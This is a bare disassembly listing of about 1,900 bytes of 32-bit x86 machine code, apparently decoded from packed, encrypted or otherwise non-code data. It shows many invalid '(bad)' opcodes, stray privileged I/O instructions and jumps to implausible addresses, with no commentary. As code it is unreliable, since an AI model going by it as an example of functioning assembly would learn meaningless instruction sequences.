  40b04d:	int    0xc8
  40b04f:	xor    DWORD PTR [eax],0xffffffd7
  40b052:	pop    ds
  40b053:	(bad)  
  40b054:	mov    eax,0xaadc0c22
  40b059:	push   eax
  40b05a:	cwde   
  40b05b:	arpl   WORD PTR [eax+0x2972f622],cx
  40b061:	fdivr  DWORD PTR [esi-0x776e96c6]
  40b067:	dec    ebp
  40b068:	or     eax,0xf3a9be22
  40b06d:	inc    esp
  40b06e:	fcomp  DWORD PTR [esi+0x2be3bdc5]
  40b074:	imul   edx,DWORD PTR [esi+0x1ca659d5],0xfffffffc
  40b07b:	jbe    0x40b081
  40b07d:	adc    BYTE PTR [esi+0x213e5d4],dl
  40b083:	xchg   DWORD PTR [ebp+0x2f],edi
  40b086:	dec    ebx
  40b087:	push   ecx
  40b088:	adc    dh,dl
  40b08a:	cmc    
  40b08b:	std    
  40b08c:	pop    esp
  40b08d:	push   edi
  40b08e:	and    ecx,DWORD PTR [edi+esi*1+0x20]
  40b092:	gs pop esi
  40b094:	cmp    dh,dh
  40b096:	cmp    edi,eax
  40b098:	or     DWORD PTR [eax],0xd9ada738
  40b09e:	into   
  40b09f:	ret    0xca5c
  40b0a2:	inc    ebx
  40b0a3:	sbb    ah,BYTE PTR [eax-0x1ccb1794]
  40b0a9:	and    DWORD PTR [edi+0x40],edi
  40b0ac:	iret   
  40b0ad:	add    DWORD PTR [eax],ebp
  40b0af:	test   BYTE PTR [ecx+0x35],ah
  40b0b2:	(bad)  
  40b0b3:	fist   WORD PTR [ebp-0x6565136a]
  40b0b9:	leave  
  40b0ba:	mov    eax,ds:0x1c0a9d86
  40b0bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0c0:	inc    eax
  40b0c1:	cwde   
  40b0c2:	das    
  40b0c3:	mov    eax,ds:0x87f00095
  40b0c8:	mov    ebx,DWORD PTR [edi+0x59]
  40b0cb:	jg     0x40b067
  40b0cd:	or     al,0x3
  40b0cf:	sbb    eax,0x37b9b192
  40b0d4:	fstp   QWORD PTR [ebp+0x1309bf82]
  40b0da:	ret    0x30ca
  40b0dd:	test   DWORD PTR [ebp-0x72],esi
  40b0e0:	and    bl,bh
  40b0e2:	shl    BYTE PTR [edi-0x64bb578c],0xbd
  40b0e9:	sbb    al,BYTE PTR [edi+0x52800cbb]
  40b0ef:	hlt    
  40b0f0:	push   edi
  40b0f1:	cmp    eax,ebp
  40b0f3:	add    ah,ch
  40b0f5:	jmp    0xf4fe5b8f
  40b0fa:	and    dh,ah
  40b0fc:	std    
  40b0fd:	fist   DWORD PTR [eax]
  40b0ff:	clc    
  40b100:	ins    BYTE PTR es:[edi],dx
  40b101:	retf   0xa374
  40b104:	xor    bh,ah
  40b106:	mov    DWORD PTR [esi],esi
  40b108:	cmp    eax,0x76fc720a
  40b10d:	and    eax,0xef0674c1
  40b112:	xchg   edx,eax
  40b113:	add    al,0x55
  40b115:	fst    QWORD PTR [ecx+0xa677789]
  40b11b:	mov    DWORD PTR [ebx],0xb614f2c0
  40b121:	out    0x59,eax
  40b123:	jae    0x40b184
  40b125:	pop    ecx
  40b126:	inc    ecx
  40b127:	(bad)  
  40b129:	adc    eax,0xb41eadec
  40b12e:	fisttp DWORD PTR [eax+0x31]
  40b131:	fadd   QWORD PTR [eax]
  40b133:	aas    
  40b134:	in     al,0x4
  40b136:	cs idiv dl
  40b139:	inc    ecx
  40b13a:	mov    ah,0xb9
  40b13c:	daa    
  40b13d:	jo     0x40b0e8
  40b13f:	or     eax,0x63169e40
  40b144:	in     eax,dx
  40b145:	ins    DWORD PTR es:[edi],dx
  40b146:	cs sub esi,ebp
  40b149:	es inc esp
  40b14b:	jp     0x40b164
  40b14d:	fs push 0xffffffcf
  40b150:	add    cl,bl
  40b152:	aad    0x8b
  40b154:	mov    cl,0x72
  40b156:	xor    al,0x88
  40b158:	loop   0x40b192
  40b15a:	and    eax,0x52c351fa
  40b15f:	push   esi
  40b160:	call   0x2a8f:0x43aaac6f
  40b167:	arpl   WORD PTR [esi],di
  40b169:	push   0x64
  40b16b:	push   ecx
  40b16c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b16d:	and    edi,0xffffffff
  40b170:	ins    BYTE PTR es:[edi],dx
  40b171:	stc    
  40b172:	mov    esp,0x8641f323
  40b177:	sub    DWORD PTR [eax+0xe],esp
  40b17a:	dec    esi
  40b17b:	adc    cl,BYTE PTR [esi]
  40b17d:	pusha  
  40b17e:	ret    
  40b17f:	fnstenv [ebx+0x68697d7a]
  40b185:	jno    0x40b1a3
  40b187:	sub    al,0x2c
  40b189:	(bad)  
  40b18b:	mov    bh,0x44
  40b18d:	sub    BYTE PTR [ebx],al
  40b18f:	ja     0x40b16c
  40b191:	mov    dh,0xd4
  40b193:	out    0x79,al
  40b195:	push   edi
  40b196:	xchg   ebp,eax
  40b197:	ja     0x40b202
  40b199:	mul    BYTE PTR [esi+0x2daa52d8]
  40b19f:	in     eax,dx
  40b1a0:	sub    bh,BYTE PTR [eax]
  40b1a2:	sub    eax,0x41eb4aef
  40b1a7:	mov    ds:0x5100ae29,eax
  40b1ac:	cmp    DWORD PTR [esi+eax*8+0x61],edx
  40b1b0:	fadd   st(2),st
  40b1b2:	mov    ecx,DWORD PTR [ebp-0x3fc3736d]
  40b1b8:	mov    al,cl
  40b1ba:	lahf   
  40b1bb:	push   esp
  40b1bc:	push   DWORD PTR [esp+edi*4-0x53519177]
  40b1c3:	add    DWORD PTR [esi-0x198ad1e7],esp
  40b1c9:	xor    DWORD PTR [ecx+0x30],eax
  40b1cc:	xor    ebp,ecx
  40b1ce:	cmp    al,0xda
  40b1d0:	xchg   DWORD PTR [edx+0x17a71038],ecx
  40b1d6:	add    BYTE PTR [ebx],0x98
  40b1d9:	push   ecx
  40b1da:	imul   edi,DWORD PTR [edx-0x7193081c],0x40
  40b1e1:	mov    ah,0x4a
  40b1e3:	and    esp,DWORD PTR [ecx]
  40b1e5:	pop    esi
  40b1e6:	in     al,0xcb
  40b1e8:	dec    edi
  40b1e9:	ins    DWORD PTR es:[edi],dx
  40b1ea:	sub    esp,DWORD PTR [edx]
  40b1ec:	adc    DWORD PTR [ebp-0x2c905eb1],esi
  40b1f2:	xchg   esp,eax
  40b1f3:	jmp    0x67100e7d
  40b1f8:	mov    ds:0x6ab9c492,al
  40b1fd:	aam    0xd0
  40b1ff:	test   BYTE PTR fs:[ebx],dh
  40b202:	dec    esi
  40b203:	sub    eax,0x4869bacc
  40b208:	addr16 out 0x1d,al
  40b20b:	clc    
  40b20c:	add    BYTE PTR [edx+0x20],dh
  40b20f:	mov    ds:0xf5282b9,al
  40b214:	fwait
  40b215:	scas   eax,DWORD PTR es:[edi]
  40b216:	and    ah,BYTE PTR [ecx]
  40b218:	loope  0x40b240
  40b21a:	inc    ebx
  40b21b:	inc    ecx
  40b21c:	scas   eax,DWORD PTR es:[edi]
  40b21d:	pop    edi
  40b21e:	inc    ebx
  40b21f:	loope  0x40b216
  40b221:	aaa    
  40b222:	shr    DWORD PTR [eax+0x39],0x4
  40b226:	(bad)  
  40b227:	aas    
  40b228:	(bad)  
  40b22a:	inc    ebp
  40b22b:	sar    DWORD PTR [edi-0x3],1
  40b22e:	fcmovu st,st(1)
  40b230:	scas   eax,DWORD PTR es:[edi]
  40b231:	(bad)  
  40b232:	xchg   ebx,eax
  40b233:	jae    0x40b238
  40b235:	mov    bl,0xaa
  40b237:	call   0x8d655301
  40b23c:	das    
  40b23d:	loopne 0x40b23b
  40b23f:	hlt    
  40b240:	cmc    
  40b241:	out    0x34,al
  40b243:	imul   edx,DWORD PTR [ecx+0x61be3be5],0xffffffc3
  40b24a:	cmp    ebx,DWORD PTR [ecx]
  40b24c:	lods   eax,DWORD PTR ds:[esi]
  40b24d:	outs   dx,DWORD PTR ds:[esi]
  40b24e:	ficomp DWORD PTR [ebx+0x65]
  40b251:	and    al,0x4b
  40b253:	mov    bh,BYTE PTR [eax+0x40]
  40b256:	call   0xfa0cfb9c
  40b25b:	cmp    esi,esi
  40b25d:	mov    WORD PTR [esi],?
  40b25f:	mov    al,ds:0x296ae5e0
  40b264:	mov    dl,BYTE PTR [esi-0x76]
  40b267:	sbb    al,0x5e
  40b269:	jmp    0x40b221
  40b26b:	pop    ecx
  40b26c:	mov    dh,0x1c
  40b26e:	sbb    al,0xd8
  40b270:	fwait
  40b271:	inc    edi
  40b272:	fsubr  DWORD PTR [eax]
  40b274:	mov    dh,0xe9
  40b276:	scas   eax,DWORD PTR es:[edi]
  40b277:	ins    BYTE PTR es:[edi],dx
  40b278:	lahf   
  40b279:	mov    eax,ds:0xbe558b2
  40b27e:	mov    al,ds:0xd92df631
  40b283:	out    0xf5,eax
  40b285:	push   ebx
  40b286:	or     BYTE PTR [ebp+0x3c],bh
  40b289:	sti    
  40b28a:	repnz (bad) 
  40b28c:	mov    eax,ds:0xaa3a3fc2
  40b291:	into   
  40b292:	call   0x7abc:0xc80381bd
  40b299:	call   0xfafb:0x142972e4
  40b2a0:	pop    esp
  40b2a1:	mov    esp,0x4dc7ee6
  40b2a6:	les    edx,FWORD PTR [edi+ecx*4-0x3d]
  40b2aa:	mov    dh,dh
  40b2ac:	dec    esi
  40b2ad:	inc    ebx
  40b2ae:	inc    edx
  40b2af:	int3   
  40b2b0:	je     0x40b262
  40b2b2:	pop    ebx
  40b2b3:	and    eax,0x4165a8db
  40b2b8:	jne    0x40b260
  40b2ba:	pop    ecx
  40b2bb:	cli    
  40b2bc:	gs int3 
  40b2be:	out    0xf6,al
  40b2c0:	jl     0x40b253
  40b2c2:	jmp    0x2e49:0xbd9db972
  40b2c9:	xchg   BYTE PTR ds:0xcca05853,bh
  40b2cf:	(bad)  
  40b2d0:	mov    ch,0xd4
  40b2d2:	imul   ebp,DWORD PTR [eax+0x3123e0d7],0x96b9edc2
  40b2dc:	mov    ds:0xc60149fd,eax
  40b2e1:	aas    
  40b2e2:	jmp    ebx
  40b2e4:	int3   
  40b2e5:	jp     0x40b2ad
  40b2e7:	lods   al,BYTE PTR ds:[esi]
  40b2e8:	dec    ebx
  40b2e9:	dec    DWORD PTR [edx]
  40b2eb:	push   esi
  40b2ec:	mul    BYTE PTR [eax]
  40b2ee:	out    0xf,al
  40b2f0:	ret    0xdf43
  40b2f3:	pop    edi
  40b2f4:	pop    edi
  40b2f5:	(bad)  
  40b2f7:	cwde   
  40b2f8:	arpl   WORD PTR [ebp+0x1a],si
  40b2fb:	xor    DWORD PTR [ebp-0x7a8754f],esp
  40b301:	mov    esp,0xeb4f615a
  40b306:	mov    dl,0xe8
  40b308:	xor    edx,edi
  40b30a:	int3   
  40b30b:	imul   esi,DWORD PTR [edi+0x561a4b96],0x5f
  40b312:	cs ja  0x40b2b7
  40b315:	int3   
  40b316:	mov    bh,0x56
  40b318:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b319:	mov    ebp,0x94afa3d3
  40b31e:	into   
  40b31f:	cmc    
  40b320:	mov    dl,0xfc
  40b322:	and    cl,cl
  40b324:	(bad)  
  40b325:	lods   al,BYTE PTR ds:[esi]
  40b326:	mov    ch,0x64
  40b328:	xlat   BYTE PTR ds:[ebx]
  40b329:	fdivr  QWORD PTR [esi-0x40]
  40b32c:	lds    ecx,FWORD PTR [ecx-0x74]
  40b32f:	das    
  40b330:	or     eax,DWORD PTR [edx+0x16]
  40b333:	mov    esi,0x6f523d59
  40b338:	add    dh,BYTE PTR [eax*8+0x71716e74]
  40b33f:	sbb    ebp,edx
  40b341:	lods   al,BYTE PTR ds:[esi]
  40b342:	xchg   BYTE PTR [ecx],bh
  40b344:	dec    ecx
  40b345:	es add eax,0xb61447b6
  40b34b:	sahf   
  40b34c:	inc    edx
  40b34d:	cdq    
  40b34e:	xchg   esi,eax
  40b34f:	pop    ds
  40b350:	sbb    DWORD PTR [edx],eax
  40b352:	inc    ecx
  40b353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b354:	fcomp  DWORD PTR [ebp+0xe]
  40b357:	repz les ebx,FWORD PTR [edx-0x59746c7c]
  40b35e:	das    
  40b35f:	retf   
  40b360:	cmp    BYTE PTR [eax+0x5620923a],cl
  40b366:	in     al,dx
  40b367:	loopne 0x40b349
  40b369:	and    BYTE PTR [ebx+0x63ae7f2a],ah
  40b36f:	jp     0x40b336
  40b371:	sub    DWORD PTR ds:0x2dddb6a3,ebx
  40b377:	mov    edi,0x3689c281
  40b37c:	mov    BYTE PTR ds:0x9a409f7a,ch
  40b382:	jmp    0x40b3f4
  40b384:	iret   
  40b385:	adc    DWORD PTR [edx-0x48],eax
  40b388:	and    al,0x18
  40b38a:	adc    esp,DWORD PTR [ecx+eiz*8]
  40b38d:	pop    eax
  40b38e:	mov    edx,DWORD PTR [eax-0x102a43c3]
  40b394:	out    dx,al
  40b395:	xchg   edx,eax
  40b396:	pop    ebp
  40b397:	fisttp WORD PTR [ecx]
  40b399:	add    al,0x51
  40b39b:	pop    es
  40b39c:	out    dx,eax
  40b39d:	jbe    0x40b407
  40b39f:	pop    ebx
  40b3a0:	pop    DWORD PTR [ebx+0xf]
  40b3a3:	mov    ecx,0xf4fb841c
  40b3a8:	xchg   edx,eax
  40b3a9:	cmp    al,0x86
  40b3ab:	clc    
  40b3ac:	mov    ?,edx
  40b3ae:	pop    eax
  40b3af:	popf   
  40b3b0:	xchg   esi,eax
  40b3b1:	add    cl,BYTE PTR [edx]
  40b3b3:	pop    eax
  40b3b4:	and    DWORD PTR [ebp-0x176e56fc],0xbb8729da
  40b3be:	add    ebp,DWORD PTR [edx+0x15]
  40b3c1:	and    esi,DWORD PTR [ebp-0x1e76790]
  40b3c7:	ds addr16 cmp eax,0xd79f662f
  40b3ce:	ins    DWORD PTR es:[edi],dx
  40b3cf:	or     edx,DWORD PTR [edx+ebx*4+0x41]
  40b3d3:	mov    cl,0xe5
  40b3d5:	jp     0x40b403
  40b3d7:	jmp    0xf641ae2a
  40b3dc:	dec    eax
  40b3dd:	mov    ds:0x5822c092,al
  40b3e2:	dec    ebx
  40b3e3:	repz sub ebp,0xffffffd7
  40b3e7:	adc    bl,al
  40b3e9:	push   ss
  40b3ea:	hlt    
  40b3eb:	cld    
  40b3ec:	jnp    0x40b452
  40b3ee:	not    DWORD PTR ss:[esi+0x2daf7a0c]
  40b3f5:	jp     0x40b3bb
  40b3f7:	mov    edx,0xd5cc0a8b
  40b3fc:	bound  ebx,QWORD PTR [eax+0xa05d3e9]
  40b402:	nop
  40b403:	push   0x3
  40b405:	adc    DWORD PTR [edi+0x23],ecx
  40b408:	mov    eax,ds:0x6f2cfc6f
  40b40d:	aaa    
  40b40e:	jmp    0x281434c0
  40b413:	mov    ecx,ebp
  40b415:	sub    al,0xa0
  40b417:	push   0xdbf47f23
  40b41c:	fsubr  DWORD PTR [ebx-0x75f73be0]
  40b422:	in     eax,dx
  40b423:	ret    0x7e50
  40b426:	std    
  40b427:	pop    ebp
  40b428:	(bad)  
  40b429:	aaa    
  40b42a:	std    
  40b42b:	and    eax,0x4d89c989
  40b430:	add    BYTE PTR [edi],cl
  40b432:	xchg   ebp,eax
  40b433:	sub    al,0xa0
  40b435:	xor    DWORD PTR [edi+0xc47be85],edi
  40b43b:	hlt    
  40b43c:	adc    dh,dl
  40b43e:	push   esp
  40b440:	int3   
  40b441:	and    al,0x23
  40b443:	popf   
  40b444:	mov    ah,0x39
  40b446:	sar    bh,0x30
  40b449:	mov    al,ds:0xc4181bba
  40b44e:	push   ebp
  40b44f:	xor    esi,edx
  40b451:	(bad)  
  40b452:	cmc    
  40b453:	sbb    eax,0x7115a9b3
  40b458:	pop    esp
  40b459:	push   es
  40b45a:	ja     0x40b4c7
  40b45c:	daa    
  40b45d:	xor    DWORD PTR [ecx],edx
  40b45f:	into   
  40b460:	mov    DWORD PTR [esi+0x40],eax
  40b463:	je     0x40b45f
  40b465:	push   0xf75b710b
  40b46a:	inc    eax
  40b46b:	repnz popf 
  40b46d:	jae    0x40b4d3
  40b46f:	iret   
  40b470:	sub    BYTE PTR [eax-0x25],ch
  40b473:	jnp    0x40b43d
  40b475:	mov    eax,ds:0xd3ec193c
  40b47a:	jle    0x40b482
  40b47c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b47d:	repnz icebp 
  40b47f:	and    edi,esp
  40b481:	mov    ch,0xab
  40b483:	mov    eax,0xb3a12d08
  40b488:	ja     0x40b46b
  40b48a:	xlat   BYTE PTR ds:[ebx]
  40b48b:	out    dx,eax
  40b48c:	je     0x40b4d4
  40b48e:	sti    
  40b48f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b490:	dec    edi
  40b491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b492:	fstp   DWORD PTR [eax+edx*8]
  40b495:	js     0x40b479
  40b497:	std    
  40b498:	xchg   esp,eax
  40b499:	loopne 0x40b423
  40b49b:	cld    
  40b49c:	and    DWORD PTR [esp+ecx*1+0x59dcd007],ebx
  40b4a3:	mov    dl,0x78
  40b4a5:	aaa    
  40b4a6:	xchg   DWORD PTR [eax-0x65],ebp
  40b4a9:	les    eax,FWORD PTR [ecx+0x72]
  40b4ac:	into   
  40b4ad:	mov    edi,0x354e20ff
  40b4b2:	ss ins DWORD PTR es:[edi],dx
  40b4b4:	or     bh,bh
  40b4b6:	pop    esp
  40b4b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4b8:	fmulp  st(2),st
  40b4ba:	popa   
  40b4bb:	push   eax
  40b4bc:	mov    dl,0x83
  40b4be:	scas   eax,DWORD PTR es:[edi]
  40b4bf:	(bad)  
  40b4c0:	mov    ecx,0x492b2bdd
  40b4c5:	in     eax,0xe0
  40b4c7:	retf   0x545b
  40b4ca:	inc    ebx
  40b4cb:	cmp    al,0x94
  40b4cd:	xor    al,0x13
  40b4cf:	adc    al,0x67
  40b4d2:	sub    BYTE PTR [edx-0x73ffae00],dh
  40b4d8:	push   ds
  40b4d9:	add    ebp,DWORD PTR [esp+edi*8]
  40b4dc:	push   esp
  40b4dd:	(bad)  
  40b4de:	aas    
  40b4df:	test   eax,0x5a7a73d8
  40b4e4:	mov    eax,ds:0x496855c3
  40b4e9:	stos   DWORD PTR es:[edi],eax
  40b4ea:	icebp  
  40b4eb:	js     0x40b47d
  40b4ed:	ret    0x1dde
  40b4f0:	jl     0x40b512
  40b4f2:	daa    
  40b4f3:	push   esi
  40b4f4:	xchg   edi,eax
  40b4f5:	xchg   ecx,eax
  40b4f6:	out    dx,al
  40b4f7:	(bad)
  40b4fc:	das    
  40b4fd:	idiv   DWORD PTR [esi]
  40b4ff:	xchg   ecx,eax
  40b500:	cmp    al,0x7
  40b502:	cs es popf 
  40b505:	mov    ebp,0x3b6f45b2
  40b50a:	fisubr DWORD PTR [edx]
  40b50c:	push   eax
  40b50d:	dec    esi
  40b50e:	mov    al,ds:0xa539bee2
  40b513:	xor    DWORD PTR [esi],0x20141b40
  40b519:	push   ds
  40b51a:	mov    bl,0xad
  40b51c:	ins    DWORD PTR es:[edi],dx
  40b51d:	add    al,0xd3
  40b51f:	inc    ecx
  40b520:	mov    ch,0xc4
  40b522:	mov    al,ds:0xa3a8436b
  40b527:	xchg   ebx,eax
  40b528:	push   ebp
  40b529:	mov    bh,0x9e
  40b52b:	xchg   esi,edi
  40b52d:	jmp    0x40b5a1
  40b52f:	fisttp QWORD PTR [ecx+0x7d]
  40b532:	in     al,dx
  40b533:	mov    ah,0x97
  40b535:	cmp    bh,BYTE PTR [esi-0x6c1c2607]
  40b53b:	sub    DWORD PTR [edi+0x53],ebx
  40b53e:	shr    esp,1
  40b540:	(bad)  
  40b541:	bnd ret 0x4590
  40b545:	sbb    bl,bl
  40b547:	xor    al,0x33
  40b549:	ret    
  40b54a:	aas    
  40b54b:	aaa    
  40b54c:	das    
  40b54d:	add    DWORD PTR [bx+di],eax
  40b550:	aaa    
  40b551:	cmp    ch,cl
  40b553:	fsub   QWORD PTR [esi]
  40b555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b556:	hlt    
  40b557:	nop
  40b558:	push   cs
  40b559:	jnp    0x40b598
  40b55b:	mov    ds:0x336d539b,eax
  40b560:	pop    esi
  40b561:	fiadd  WORD PTR [esi-0x20]
  40b564:	mov    ch,0xb7
  40b566:	mov    edi,0x70494151
  40b56b:	scas   al,BYTE PTR es:[edi]
  40b56c:	stos   BYTE PTR es:[edi],al
  40b56d:	cli    
  40b56e:	xchg   ebx,eax
  40b56f:	sahf   
  40b570:	sub    eax,0xd660b5ba
  40b575:	jmp    0xa68f:0xde45ceb0
  40b57c:	or     al,0x27
  40b57f:	fsub   st,st(2)
  40b581:	outs   dx,BYTE PTR ds:[esi]
  40b582:	mov    bh,0x46
  40b584:	ficom  DWORD PTR [edi]
  40b586:	mov    edi,0x72f58704
  40b58b:	xor    al,0x24
  40b58d:	ds addr16 jbe 0x40b5a0
  40b591:	mov    bh,0x8c
  40b593:	dec    ebx
  40b594:	scas   eax,DWORD PTR es:[edi]
  40b595:	xlat   BYTE PTR ds:[ebx]
  40b596:	(bad)  
  40b597:	in     eax,dx
  40b598:	add    ah,BYTE PTR [edi-0x13423040]
  40b59e:	(bad)  
  40b59f:	dec    esi
  40b5a0:	test   DWORD PTR [eax+0x70],edi
  40b5a3:	gs and eax,0x3315d66d
  40b5a9:	loopne 0x40b556
  40b5ab:	scas   al,BYTE PTR es:[edi]
  40b5ac:	aam    0xd9
  40b5ae:	adc    eax,0x5923f1b8
  40b5b3:	and    dh,dh
  40b5b5:	jmp    0x40b541
  40b5b7:	ficomp DWORD PTR [edx]
  40b5b9:	pop    ecx
  40b5ba:	call   0xd7d88575
  40b5bf:	daa    
  40b5c0:	sbb    DWORD PTR [eax+0x58],esi
  40b5c3:	js     0x40b59c
  40b5c5:	sub    bh,BYTE PTR [edx]
  40b5c7:	and    eax,0x84ef30cd
  40b5cc:	pop    es
  40b5cd:	or     eax,0x2b5cd419
  40b5d2:	jne    0x40b55a
  40b5d4:	sbb    edx,eax
  40b5d6:	std    
  40b5d7:	cli    
  40b5d8:	inc    esi
  40b5d9:	or     BYTE PTR [edx],al
  40b5db:	or     ch,ah
  40b5dd:	out    0x9b,al
  40b5df:	add    ecx,DWORD PTR [esp+eax*2+0x1eec9c41]
  40b5e6:	shl    DWORD PTR es:[edi-0x432440dc],cl
  40b5ed:	test   dh,bh
  40b5ef:	shr    BYTE PTR [ecx+0x28],0x39
  40b5f3:	or     eax,0xd290f4d4
  40b5f8:	gs lock jmp 0x40b5f4
  40b5fc:	rol    DWORD PTR ds:0x7ff60c5d,cl
  40b602:	jg     0x40b5bb
  40b604:	sbb    ecx,DWORD PTR fs:[ecx]
  40b607:	sbb    eax,0x15a07ba
  40b60c:	loop   0x40b5b2
  40b60e:	imul   edi,DWORD PTR [esi],0x9cf83e8a
  40b614:	xchg   ebp,eax
  40b615:	nop
  40b616:	jo     0x40b67b
  40b618:	loope  0x40b66d
  40b61a:	shr    DWORD PTR [edi-0x79],cl
  40b61d:	jl     0x40b61b
  40b61f:	jae    0x40b5b8
  40b621:	mov    ah,0xb0
  40b623:	cmc    
  40b624:	pop    ds
  40b625:	and    ch,ah
  40b627:	gs loopne 0x40b62e
  40b62a:	int    0xfa
  40b62c:	jo     0x40b60a
  40b62e:	jne    0x40b6a8
  40b630:	int3   
  40b631:	call   DWORD PTR [edx+0x25]
  40b634:	cld    
  40b635:	sbb    ch,BYTE PTR [edx]
  40b637:	and    eax,0x49adfc48
  40b63c:	mov    ds:0x4fc6f06b,al
  40b641:	fbstp  TBYTE PTR [edi-0x57]
  40b644:	push   0x103c6bee
  40b649:	push   ebp
  40b64a:	cmc    
  40b64b:	jno    0x40b67f
  40b64d:	test   BYTE PTR [edi],0x57
  40b650:	adc    BYTE PTR [ecx],dh
  40b652:	pop    es
  40b653:	lahf   
  40b654:	cs push eax
  40b656:	cli    
  40b657:	adc    BYTE PTR [esi-0x48],ah
  40b65a:	out    dx,eax
  40b65b:	(bad)  
  40b65c:	in     eax,0xb5
  40b65e:	xchg   edx,eax
  40b65f:	inc    esp
  40b660:	adc    DWORD PTR [edx-0x50],esi
  40b663:	fstp   QWORD PTR [eax-0x2]
  40b666:	leave  
  40b667:	dec    ebx
  40b668:	test   al,0xe5
  40b66a:	test   esi,esi
  40b66c:	push   eax
  40b66d:	sbb    dl,0xc6
  40b670:	aaa    
  40b671:	pop    ecx
  40b672:	push   ds
  40b673:	pop    es
  40b674:	jp     0x40b667
  40b676:	sub    dh,BYTE PTR [esi]
  40b678:	shl    DWORD PTR [esi],0x6e
  40b67b:	mov    ecx,0xbec1fa3e
  40b680:	xchg   edx,eax
  40b681:	rcl    ebp,1
  40b683:	outs   dx,DWORD PTR ds:[esi]
  40b684:	adc    al,0xdb
  40b686:	ret    0xcd6e
  40b689:	repnz cmp DWORD PTR [eax-0x1f],eax
  40b68d:	daa    
  40b68e:	stos   DWORD PTR es:[edi],eax
  40b68f:	sar    BYTE PTR [edx+0x726a7c53],1
  40b695:	mov    ebp,0xd211f486
  40b69a:	bound  edx,QWORD PTR [ebp-0x6b]
  40b69d:	ds adc al,0x69
  40b6a0:	sub    dh,dh
  40b6a2:	sub    bl,0x18
  40b6a5:	xchg   BYTE PTR [edi+0x3badf5ec],dh
  40b6ab:	mov    al,0xf2
  40b6ad:	loope  0x40b6c7
  40b6af:	fdivr  st,st(7)
  40b6b1:	arpl   WORD PTR [ebp+0x16],bx
  40b6b4:	mov    al,0x31
  40b6b6:	xchg   ecx,eax
  40b6b7:	scas   al,BYTE PTR es:[edi]
  40b6b8:	repnz scas eax,DWORD PTR es:[edi]
  40b6ba:	xor    ch,BYTE PTR [ecx-0x7a]
  40b6bd:	mov    cl,0x2c
  40b6bf:	mov    ebx,0x20ac1d6e
  40b6c4:	dec    BYTE PTR [edx+0x4d]
  40b6c7:	jmp    0x40b726
  40b6c9:	cmp    DWORD PTR [eax-0x80],esp
  40b6cc:	lock push es
  40b6ce:	mov    ebp,0xf2ad400a
  40b6d3:	nop
  40b6d4:	pop    edx
  40b6d5:	or     DWORD PTR [bp+di],ebx
  40b6d8:	aad    0x3
  40b6da:	sub    bh,BYTE PTR [esi+0x2a144e33]
  40b6e0:	iret   
  40b6e1:	sub    eax,0x838f6821
  40b6e6:	fnstcw WORD PTR [edi-0x9d9e3c8]
  40b6ec:	in     eax,dx
  40b6ed:	bound  ecx,QWORD PTR [ebp+0xba8ed33]
  40b6f3:	in     eax,dx
  40b6f4:	in     eax,dx
  40b6f5:	mov    al,0x80
  40b6f7:	add    DWORD PTR [edi-0x7c],esi
  40b6fa:	push   ds
  40b6fb:	(bad)  [ecx+eiz*2]
  40b6fe:	or     eax,0xc73e31f5
  40b703:	dec    edx
  40b704:	icebp  
  40b705:	fcmovnu st,st(2)
  40b707:	iret   
  40b708:	es cmp edx,ecx
  40b70b:	or     bl,BYTE PTR [edx+0x6c948e08]
  40b711:	mov    al,0xc2
  40b713:	mov    BYTE PTR [edi+0x30],0x37
  40b717:	stc    
  40b718:	loop   0x40b746
  40b71a:	retf   
  40b71b:	add    ecx,DWORD PTR [ebx]
  40b71d:	mov    ds:0xd4d1b208,al
  40b722:	lahf   
  40b723:	xchg   BYTE PTR ds:0xd458e19b,ah
  40b729:	sub    ecx,esi
  40b72b:	ss ss mov esp,0x1c13d15
  40b732:	icebp  
  40b733:	dec    ecx
  40b734:	mov    ds:0xf59e3ec1,eax
  40b739:	js     0x40b786
  40b73b:	dec    edi
  40b73c:	test   eax,0x4caf2c74
  40b741:	push   esp
  40b742:	xor    ah,BYTE PTR [edx-0x32]
  40b745:	jns    0x40b786
  40b747:	mov    ds:0xc9bffc0d,al
  40b74c:	mov    BYTE PTR [edx+0x5b274146],0x94
  40b753:	mov    esi,0x95dc7976
  40b758:	das    
  40b759:	mov    bl,0x69
  40b75b:	and    ebx,DWORD PTR ds:0xbf74dce6
  40b761:	jecxz  0x40b70f
  40b763:	inc    eax
  40b764:	mov    ds:0xd00a95c7,al
  40b769:	sbb    al,0xff
  40b76b:	mov    esi,0x1b4ee04f
  40b770:	leave  
  40b771:	cmp    eax,eax
  40b773:	ss (bad) 
  40b776:	add    DWORD PTR [eax-0x56],ecx
  40b779:	jl     0x40b719
  40b77b:	ins    BYTE PTR es:[edi],dx
  40b77c:	mov    esp,0x9ad12c7d
  40b781:	les    ecx,FWORD PTR [ebx-0x6fe72f21]
  40b787:	mov    ch,0xac
  40b789:	into   
  40b78a:	icebp  
  40b78b:	in     eax,dx
  40b78c:	mov    ds:0xc841c853,eax
  40b791:	test   eax,0xf3c9769c
  40b796:	fnstenv [eax]
  40b798:	pop    ebp
  40b799:	outs   dx,BYTE PTR ds:[esi]
  40b79a:	mov    ebp,0x4c703a80
  40b79f:	xor    al,0x52
  40b7a1:	cs out dx,eax
  40b7a3:	xor    al,0xd1
  40b7a5:	call   0x32b99c56
  40b7aa:	or     eax,0x36bb1fcc
  40b7af:	rcr    dl,cl
  40b7b1:	sub    al,0xf7
  40b7b3:	dec    ebp
  40b7b4:	push   ebx
  40b7b5:	out    0xf4,eax
  40b7b7:	test   eax,0xc78cfa17
  40b7bc:	jno    0x40b7ad
  40b7be:	adc    ah,bl
  40b7c0:	add    eax,0xecc0fbdc
  40b7c5:	ror    BYTE PTR [edi+0x3d],0x5f
  40b7c9:	loope  0x40b828
  40b7cb:	enter  0x300b,0xd9
  40b7cf:	into   
  40b7d0:	pop    esi
  40b7d1:	mov    bl,0x8e
  40b7d3:	jmp    DWORD PTR [edi]
  40b7d5:	jg     0x40b810
  40b7d7:	mov    ch,cl
  40b7d9:	cs mov cl,0xf0
  40b7dc:	cs inc eax
